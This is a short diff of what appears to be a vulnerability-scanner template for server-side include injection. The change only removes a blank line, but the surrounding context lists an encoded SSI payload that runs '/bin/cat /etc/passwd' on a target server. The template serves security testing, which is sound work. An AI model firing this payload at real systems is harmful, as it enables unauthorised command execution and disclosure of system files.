@@ -23,7 +23,6 @@ http:
       - type: dsl
         dsl:
           - 'method == "GET"'       # only run on GET URLs
-
     payloads:
       command:
         - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
